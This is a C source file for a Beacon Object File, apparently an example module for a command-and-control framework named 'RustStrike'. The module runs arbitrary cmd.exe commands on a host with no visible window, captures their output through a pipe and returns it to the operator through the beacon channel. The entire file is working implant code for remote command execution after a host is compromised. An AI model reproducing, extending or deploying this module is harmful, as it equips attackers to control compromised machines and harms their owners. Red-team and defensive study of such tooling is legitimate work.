/*
 * cmd_exec BOF for RustStrike.
 *
 * Runs a cmd.exe command and returns its stdout/stderr.
 *
 *   args: the command line as plain text (no CS length-prefix), e.g.
 *   "whoami", "ipconfig /all", "dir C:\\Windows". Type it directly in the
 *   GUI's text-args field — no .bin file needed.
 *
 * Uses CreateProcessA with a redirected pipe (no window), reads the child's
 * output, and prints it back via BeaconPrintf(CALLBACK_OUTPUT, "%s", ...).
 *
 * Build (mingw):
 *   gcc -c examples/cmd_exec.c -o examples/cmd_exec.x64.o
 */
#include <windows.h>
#include "beacon.h"

/* Dynamic imports — resolved by the loader as __imp_KERNEL32$function. */
DECLSPEC_IMPORT WINBOOL WINAPI KERNEL32$CreateProcessA(LPCSTR, LPSTR,
    LPSECURITY_ATTRIBUTES, LPSECURITY_ATTRIBUTES, WINBOOL, DWORD, LPVOID,
    LPCSTR, LPSTARTUPINFOA, LPPROCESS_INFORMATION);
DECLSPEC_IMPORT WINBOOL WINAPI KERNEL32$CreatePipe(PHANDLE, PHANDLE,
    LPSECURITY_ATTRIBUTES, DWORD);
DECLSPEC_IMPORT WINBOOL WINAPI KERNEL32$SetHandleInformation(HANDLE, DWORD, DWORD);
DECLSPEC_IMPORT WINBOOL WINAPI KERNEL32$ReadFile(HANDLE, LPVOID, DWORD,
    LPDWORD, LPOVERLAPPED);
DECLSPEC_IMPORT WINBOOL WINAPI KERNEL32$WaitForSingleObject(HANDLE, DWORD);
DECLSPEC_IMPORT WINBOOL WINAPI KERNEL32$GetExitCodeProcess(HANDLE, LPDWORD);
DECLSPEC_IMPORT WINBOOL WINAPI KERNEL32$CloseHandle(HANDLE);
DECLSPEC_IMPORT HANDLE WINAPI KERNEL32$GetProcessHeap(VOID);
DECLSPEC_IMPORT LPVOID WINAPI KERNEL32$HeapAlloc(HANDLE, DWORD, SIZE_T);
DECLSPEC_IMPORT WINBOOL WINAPI KERNEL32$HeapFree(HANDLE, DWORD, LPVOID);
DECLSPEC_IMPORT DWORD WINAPI KERNEL32$GetLastError(VOID);
DECLSPEC_IMPORT int WINAPI KERNEL32$MultiByteToWideChar(UINT, DWORD, LPCSTR, int, LPWSTR, int);
DECLSPEC_IMPORT int WINAPI KERNEL32$WideCharToMultiByte(UINT, DWORD, LPCWSTR, int, LPSTR, int, LPCSTR, LPBOOL);
DECLSPEC_IMPORT int __cdecl MSVCRT$_snprintf(char *, size_t, const char *, ...);

#define BUF_SIZE 65536

void go(char *args, int alen) {
    char *buf = NULL;   /* heap-allocated output buffer (avoid a 64KB stack frame) */
    DWORD total = 0;
    SECURITY_ATTRIBUTES sa;
    HANDLE hRead = NULL, hWrite = NULL;
    STARTUPINFOA si;
    PROCESS_INFORMATION pi;
    char cmdline[1024];
    /* The command is the raw args buffer as text (no CS length-prefix). Copy
     * alen bytes into a NUL-terminated buffer so CreateProcessA gets a clean
     * C string. Cap at the cmdline buffer size. */
    char cmd[512];
    int clen = alen < (int)sizeof(cmd) - 1 ? alen : (int)sizeof(cmd) - 1;
    if (clen <= 0) {
        BeaconPrintf(CALLBACK_ERROR, "cmd_exec: no command specified");
        return;
    }
    /* copy + NUL-terminate */
    for (int i = 0; i < clen; i++) cmd[i] = args[i];
    cmd[clen] = 0;
    /* strip a trailing newline if the GUI/source added one */
    while (clen > 0 && (cmd[clen - 1] == '\n' || cmd[clen - 1] == '\r')) {
        cmd[--clen] = 0;
    }
    if (clen == 0) {
        BeaconPrintf(CALLBACK_ERROR, "cmd_exec: no command specified");
        return;
    }

    HANDLE heap = KERNEL32$GetProcessHeap();
    buf = (char *) KERNEL32$HeapAlloc(heap, 0 /* HEAP_ZERO_MEMORY is 0x08 */, BUF_SIZE);
    if (!buf) {
        BeaconPrintf(CALLBACK_ERROR, "cmd_exec: out of memory");
        return;
    }
    /* zero the buffer */
    for (int i = 0; i < BUF_SIZE; i++) buf[i] = 0;

    /* Build "cmd.exe /c <command>". CreateProcessA may modify cmdline, so it
     * must be writable. */
    MSVCRT$_snprintf(cmdline, sizeof(cmdline), "cmd.exe /c %s", cmd);
    cmdline[sizeof(cmdline) - 1] = 0;

    sa.nLength = sizeof(sa);
    sa.bInheritHandle = TRUE;
    sa.lpSecurityDescriptor = NULL;
    if (!KERNEL32$CreatePipe(&hRead, &hWrite, &sa, 0)) {
        BeaconPrintf(CALLBACK_ERROR, "cmd_exec: CreatePipe failed (%lu)",
                     KERNEL32$GetLastError());
        return;
    }
    /* The read end must NOT be inherited by the child. */
    KERNEL32$SetHandleInformation(hRead, 0x00000001 /* HANDLE_FLAG_INHERIT */, 0);

    ZeroMemory(&si, sizeof(si));
    si.cb = sizeof(si);
    si.dwFlags = 0x00000100 /* STARTF_USESTDHANDLES */;
    si.hStdOutput = hWrite;
    si.hStdError = hWrite;
    si.hStdInput = NULL;
    ZeroMemory(&pi, sizeof(pi));

    if (!KERNEL32$CreateProcessA(NULL, cmdline, NULL, NULL, TRUE,
            0x08000000 /* CREATE_NO_WINDOW */, NULL, NULL, &si, &pi)) {
        BeaconPrintf(CALLBACK_ERROR, "cmd_exec: CreateProcessA failed (%lu)",
                     KERNEL32$GetLastError());
        KERNEL32$CloseHandle(hRead);
        KERNEL32$CloseHandle(hWrite);
        return;
    }
    /* Close our copy of the write end so ReadFile returns 0 when child exits. */
    KERNEL32$CloseHandle(hWrite);

    /* Drain the pipe. */
    DWORD got = 0;
    while (KERNEL32$ReadFile(hRead, buf + total,
                             BUF_SIZE - 1 - total, &got, NULL) && got > 0) {
        total += got;
        if (total >= BUF_SIZE - 1) break;
    }
    buf[total] = 0;

    KERNEL32$WaitForSingleObject(pi.hProcess, 0xFFFFFFFF /* INFINITE */);
    DWORD exitcode = 0;
    KERNEL32$GetExitCodeProcess(pi.hProcess, &exitcode);

    if (total > 0) {
        /* cmd.exe writes in the console's OEM/ANSI codepage (GBK/CP936 on
         * Chinese Windows). The loader captures bytes as-is and JSON-encodes
         * them, so raw GBK would arrive as mojibake. Convert CP_ACP → UTF-16
         * → UTF-8 here so the output is valid UTF-8 by the time it's captured.
         * Fall back to the raw buffer if the conversion is a no-op/empty. */
        int wlen = KERNEL32$MultiByteToWideChar(0 /*CP_ACP*/, 0, buf, (int)total, NULL, 0);
        if (wlen > 0) {
            wchar_t *wbuf = (wchar_t *) KERNEL32$HeapAlloc(heap, 0, (wlen + 1) * 2);
            if (wbuf) {
                KERNEL32$MultiByteToWideChar(0, 0, buf, (int)total, wbuf, wlen);
                int ulen = KERNEL32$WideCharToMultiByte(65001 /*CP_UTF8*/, 0,
                    wbuf, wlen, NULL, 0, NULL, NULL);
                if (ulen > 0) {
                    char *utf8 = (char *) KERNEL32$HeapAlloc(heap, 0, ulen + 1);
                    if (utf8) {
                        KERNEL32$WideCharToMultiByte(65001, 0, wbuf, wlen, utf8, ulen, NULL, NULL);
                        utf8[ulen] = 0;
                        /* BeaconOutput is binary-safe (explicit length); %s
                         * would also work since UTF-8 text has no embedded NUL. */
                        BeaconOutput(CALLBACK_OUTPUT, utf8, ulen);
                        KERNEL32$HeapFree(heap, 0, utf8);
                        KERNEL32$HeapFree(heap, 0, wbuf);
                        KERNEL32$CloseHandle(hRead);
                        KERNEL32$CloseHandle(pi.hProcess);
                        KERNEL32$CloseHandle(pi.hThread);
                        KERNEL32$HeapFree(heap, 0, buf);
                        return;
                    }
                }
                KERNEL32$HeapFree(heap, 0, wbuf);
            }
        }
        /* Conversion failed — emit raw bytes as a best effort. */
        BeaconOutput(CALLBACK_OUTPUT, buf, (int)total);
    } else {
        BeaconPrintf(CALLBACK_OUTPUT, "(no output, exit code %lu)", exitcode);
    }

    KERNEL32$CloseHandle(hRead);
    KERNEL32$CloseHandle(pi.hProcess);
    KERNEL32$CloseHandle(pi.hThread);
    KERNEL32$HeapFree(heap, 0, buf);
}
